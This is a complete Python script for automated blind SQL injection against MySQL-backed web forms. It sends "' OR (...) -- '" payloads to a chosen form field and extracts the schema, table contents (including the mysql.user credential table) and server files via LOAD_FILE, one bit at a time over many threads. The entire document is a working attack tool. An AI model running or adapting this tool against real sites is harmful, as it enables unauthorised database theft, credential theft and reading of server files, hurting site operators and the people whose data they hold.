#!/usr/bin/python3

import urllib.parse, urllib.request, time, math, argparse, sys, concurrent.futures

DEFAULT_DELAY=0

MAX_THREADS=1


class Printer:

    def __init__(self, verbosity=0, outfile=None):
        self.verbosity = verbosity
        self.outfile = outfile

    def print(self, str, req_verbosity=0, indent=0):
        if self.verbosity >= req_verbosity:
            print(('\t'*indent)+str)

    def printToFile(self, str, indent=0):
        if self.outfile is None:
            print(('\t'*indent)+str)
        else:
            self.outfile.write(('\t'*indent)+str+'\n')



class Injector:

    def __init__(self, url, success, delay, attack_field, other_fields):
        self.url = url
        self.success = success
        self.delay = (delay/1000)
        self.attack_field = attack_field
        self.other_fields = other_fields

    def post(self, data):
        req = None
        while req is None:
            try:
                req = urllib.request.urlopen(urllib.request.Request(self.url, urllib.parse.urlencode(data).encode('ascii')));
            except urllib.error.URLError:
                pass
        return req.read().decode(req.headers.get_content_charset())

    def runInjection(self, inj):
        time.sleep(self.delay)
        data = self.other_fields.copy()
        data[self.attack_field] = inj
        res = self.post(data)
        return self.success in res

    def checkBit(self, check):
        return self.runInjection("' OR (%s) -- '" % check)

    def getNumberInRange(self, obj, lower, upper):
        diff = upper-lower
        if diff == 0:
            return lower
        if diff == 1:
            return upper if self.checkBit("(%s)=%d" % (obj, upper)) else lower
        mid = lower+math.floor(diff/2)
        return self.getNumberInRange(obj, lower, mid) if self.checkBit("(%s)<=%d" % (obj, mid)) else self.getNumberInRange(obj, mid, upper)

    def getNumber(self, obj):
        if self.checkBit("(%s) IS NULL OR (%s)=0" % (obj, obj)):
            return 0
        num = 1
        while not self.checkBit("(%s)<=%d" % (obj, num)):
            num *= 2
        return self.getNumberInRange(obj, math.floor(num/2), num)

    def getCount(self, table, where="1=1"):
        if where is None:
            where = "1=1"
        return self.getNumber("SELECT COUNT(*) FROM %s.%s WHERE %s"
                              % (table.schema, table.name, where))

    def getLen(self, obj):
        return self.getNumber("LENGTH((%s))" % obj)

    def getChar(self, obj, index):
        binstr = ''.join(list(charExecutor.map(
            (lambda x: "1" if
             self.checkBit("SUBSTR(LPAD(CONV(HEX(SUBSTR((%s), %d, 1)), 16, 2), 7, 0), %d, 1)"
                           % (obj, index, x))
             else "0"), range(1, 8))))
        c = int(binstr, 2).to_bytes(15//8, 'big').decode()
        return c

    def getString(self, obj):
        namelen = self.getLen(obj)
        name = ''.join(list(stringExecutor.map(
            (lambda x: self.getChar(obj, x)),
            range(1, namelen+1))))
        return name

    def getDataFromTable(self, column, table, index=0, where="1=1"):
        if where is None:
            where = "1=1"
        return self.getString("SELECT %s FROM %s.%s WHERE %s LIMIT %d,1"
                              % (column, table.schema, table.name, where, index))

class Database:

    table_filter = "table_schema != 'INFORMATION_SCHEMA' AND (table_schema != 'mysql' OR table_name = 'user') AND table_schema != 'PERFORMANCE_SCHEMA'"

    def __init__(self, injector):
        self.injector = injector
        self.tables = []
        self.tables_table = Table(self.injector, 'tables', 'INFORMATION_SCHEMA')
        self.columns_table = Table(self.injector, 'columns', 'INFORMATION_SCHEMA')
        PRINTER.print("Getting default schema...", 1)
        self.default_schema = self.injector.getString("SELECT DATABASE()")

    def getTableCount(self):
        return self.injector.getCount(self.tables_table, self.table_filter)

    def getTableName(self, tableIndex):
        return self.injector.getDataFromTable('table_name', self.tables_table, tableIndex, self.table_filter)

    def getTableSchema(self, tableIndex):
        return self.injector.getDataFromTable('table_schema', self.tables_table, tableIndex, self.table_filter)

    def getTable(self, index, populateTable=False):
        PRINTER.print("Getting name of table %d" % index, 2)
        name = self.getTableName(index)
        PRINTER.print("Got table name: %s" % name, 2)
        schema = self.getTableSchema(index)
        PRINTER.print("Got table schema: %s" % schema, 2)
        PRINTER.print("Building table: %s (schema: %s)" % (name, schema), 1)
        table = Table(self.injector, name, schema, self.columns_table)
        if populateTable:
            table.populate()
        return table
        self.tables.append(table)
        
    def findTables(self, populateTables=False):
        PRINTER.print("Getting table count...", 1)
        count = self.getTableCount()
        PRINTER.print("Counted %d tables" % count, 1)
        self.tables.extend(list(tableExecutor.map(lambda x: self.getTable(x, populateTables), range(count))))

        

class Table:


    def __init__(self, injector, name, schema, columns_table=None):
        self.columns = []
        self.records = []
        self.name = name
        self.schema = schema
        self.injector = injector
        self.column_filter = "table_name = '%s'" % self.name
        self.columns_table = columns_table

    def populate(self, where=None):
        self.findColumns()
        PRINTER.print("", 1)
        self.findRecords(where)

    def getColumnCount(self):
        if self.columns_table is not None:
            return self.injector.getCount(self.columns_table, self.column_filter)
        else:
            return 0

    def getColumnName(self, columnIndex):
        if self.columns_table is not None:
            return self.injector.getDataFromTable('column_name', self.columns_table, columnIndex, self.column_filter)
        else:
            return ''

    def getColumn(self, index):
        name = self.getColumnName(index)
        PRINTER.print("Got column name: %s" % name, 1, 1)
        return name

    def findColumns(self):
        PRINTER.print("Getting column count...", 1, 1)
        count = self.getColumnCount()
        PRINTER.print("Found %d columns" % count, 1, 1)
        self.columns.extend(list(recordExecutor.map(self.getColumn, range(count))))


    def getRecordCount(self, where=None):
        return self.injector.getCount(self, where)

    def getRecordData(self, recordIndex, column, where=None):
        return self.injector.getDataFromTable(column, self, recordIndex, where)

    def getRecord(self, index, where):
        record = Record(self)
        for col in self.columns:
            data = self.getRecordData(index, col, where)
            PRINTER.print("Found value '%s'=>'%s' for record %d" % (col, data, index), 1, 2)
            record.setData(col, data)
        PRINTER.print("", 1)
        return record

    def findRecords(self, where=None):
        PRINTER.print("Getting record count...", 1, 1)
        count = self.getRecordCount(where)
        PRINTER.print("Found %d records" % count, 1, 1)
        self.records.extend(list(recordExecutor.map(lambda x: self.getRecord(x, where), range(count))))



class Record:

    def __init__(self, table):
        self.table = table
        self.data = {}

    def setData(self, column, data):
        if column in self.table.columns:
            self.data[column] = data


class TableWhereAction(argparse.Action):
    def __call__(self, parser, namespace, value, option_string):
        if namespace.dump_table is None:
            parser.error('Where clauses can only be used with single-table dumps.')
        else:
            setattr(namespace, self.dest, value)

class TableFieldsAction(argparse.Action):
    def __call__(self, parser, namespace, values, option_string):
        if namespace.dump_table is None:
            parser.error('Where clauses can only be used with single-table dumps.')
        else:
            curval = getattr(namespace, self.dest)
            if curval is not None:
                values = curval + values
            setattr(namespace, self.dest, values)

class Parser:

    def __init__(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('url', help='The vulnerable URL to attack')
        parser.add_argument('success', help='A string returned by a successful query but NOT by a failed query')
        parser.add_argument('attack_field', help='The vulnerable field to exploit')

        other_help = 'Other fields to submit, if necessary.\n'
        other_help += 'To specify a value with a field, append the value with a colon -- FIELD:VALUE'
        parser.add_argument('other_field', help=other_help, nargs='*')

        parser.add_argument('-o', '--outfile', '--out', help='Print results to OUTFILE upon completion', nargs='?', type=argparse.FileType('w'), default=None)
        parser.add_argument('-d', '--delay', type=int, help='Wait DELAY ms between queries', nargs='?', const=DEFAULT_DELAY, default=DEFAULT_DELAY)
        parser.add_argument('-v', '--verbose', action='count')

        table_group = parser.add_mutually_exclusive_group()
        table_group.add_argument('-f', '--file', type=str, help='Read FILE from the server instead of dumping database contents')
        table_group.add_argument('-t', '--tables_only', action='store_true', help='Only dump table names')

        dump_table_help = 'Dump data only from TABLE.'
        dump_table_help += "To specify the table's schema, prepend it with a period -- SCHEMA.TABLE"
        table_group.add_argument('-T', '--dump_table', help=dump_table_help, metavar="TABLE")

        parser.add_argument('-w', '--where', action=TableWhereAction, help='Where clause to use with -T/--dump_table')
        feq_help = 'Only dump records in which FIELD equals VALUE.'
        feq_help += ' See also: --fieldlike, --fieldlt, --fieldgt, --fieldlte, --fieldgte'
        parser.add_argument('--fieldeq', nargs=2, action=TableFieldsAction, help=feq_help, metavar=("FIELD", "VALUE"))
        parser.add_argument('--fieldlike', nargs=2, action=TableFieldsAction, help=argparse.SUPPRESS)
        parser.add_argument('--fieldlt', nargs=2, action=TableFieldsAction, help=argparse.SUPPRESS)
        parser.add_argument('--fieldgt', nargs=2, action=TableFieldsAction, help=argparse.SUPPRESS)
        parser.add_argument('--fieldlte', nargs=2, action=TableFieldsAction, help=argparse.SUPPRESS)
        parser.add_argument('--fieldgte', nargs=2, action=TableFieldsAction, help=argparse.SUPPRESS)

        parser.add_argument('-n', '--max_threads', type=int, help="Maximum number of threads to spawn. Default: %(default)s", default=MAX_THREADS)

        self.args = parser.parse_args()

    def parseOtherFields(self):
        other_fields = {}
        for field in self.args.other_field:
                spl = field.split(":", 1)
                if len(spl) == 1:
                        other_fields[spl[0]] = ''
                else:
                        other_fields[spl[0]] = spl[1]
        return other_fields

    def parseFieldArgs(self, fieldargs, formatString):
        if fieldargs is None:
            return ''
        where = ''
        for x in range(0, len(fieldargs), 2):
            where += formatString % (fieldargs[x], fieldargs[x+1])
            where += ' AND '
        return where

    def parseWhere(self):
        if (self.args.where is None and self.args.fieldeq is None
            and self.args.fieldlike is None and self.args.fieldlt is None
            and self.args.fieldgt is None and self.args.fieldlte is None
            and self.args.fieldgte is None):
            return None
        where = '1=1 AND ' if self.args.where is None else '%s AND ' % self.args.where
        where += self.parseFieldArgs(self.args.fieldeq, "%s = '%s'")
        where += self.parseFieldArgs(self.args.fieldlike, "%s LIKE '%%%s%%'")
        where += self.parseFieldArgs(self.args.fieldlt, "%s < %s")
        where += self.parseFieldArgs(self.args.fieldgt, "%s > %s")
        where += self.parseFieldArgs(self.args.fieldlte, "%s <= %s")
        where += self.parseFieldArgs(self.args.fieldgte, "%s >= %s")
        return where[:-5]

if __name__ == '__main__':
    p = Parser()
    
    verbosity = 0 if p.args.verbose is None else p.args.verbose
    PRINTER = Printer(verbosity, p.args.outfile)

    delay = DEFAULT_DELAY if p.args.delay is None else p.args.delay
    injector = Injector(p.args.url, p.args.success, delay, p.args.attack_field, p.parseOtherFields())

    if p.args.file is None:
        PRINTER.print("Performing injection test...")
        if not injector.checkBit("1=1"):
            PRINTER.print("Failed injection! Are you sure your settings are correct?")
            exit(1)
        PRINTER.print("Success!")
        
        tableExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(p.args.max_threads*0.01), 1))
        recordExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(p.args.max_threads*0.09), 1))
        stringExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(p.args.max_threads*0.1), 1))
        charExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(p.args.max_threads*0.8), 1))
        
        db = Database(injector)
        if p.args.dump_table is None:
            db.findTables(not p.args.tables_only)
        else:
            s = p.args.dump_table.split(".")
            if len(s) == 1:
                print("Dumping table %s" % s[0])
                table = Table(injector, s[0], db.default_schema, db.columns_table)
            else:
                print("Dumping table %s.%s" % (s[0], s[1]))
                table = Table(injector, s[1], s[0], db.columns_table)
            table.populate(p.parseWhere())
            db.tables.append(table)

        PRINTER.printToFile("========== DATABASE DUMP ==========")
        for table in db.tables:
            PRINTER.printToFile("======= TABLE: %s.%s" % (table.schema, table.name))
            for record in table.records:
                for column, value in record.data.items():
                    PRINTER.printToFile("%s: %s" % (column, value), 1)
                PRINTER.printToFile("")
            PRINTER.printToFile("")

        tableExecutor.shutdown()
        recordExecutor.shutdown()
        stringExecutor.shutdown()
        charExecutor.shutdown()
    else:
        PRINTER.print("Performing file read test...")
        if injector.checkBit("LOAD_FILE('%s') IS NULL" % p.args.file):
            PRINTER.print("Unable to read file: %s" % p.args.file)
            exit(1)
        PRINTER.print("Success!")
        
        stringExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(1/9*p.args.max_threads), 1))
        charExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(8/9*p.args.max_threads), 1))

        PRINTER.printToFile(injector.getString("LOAD_FILE('%s')" % p.args.file))

        stringExecutor.shutdown()
        charExecutor.shutdown()
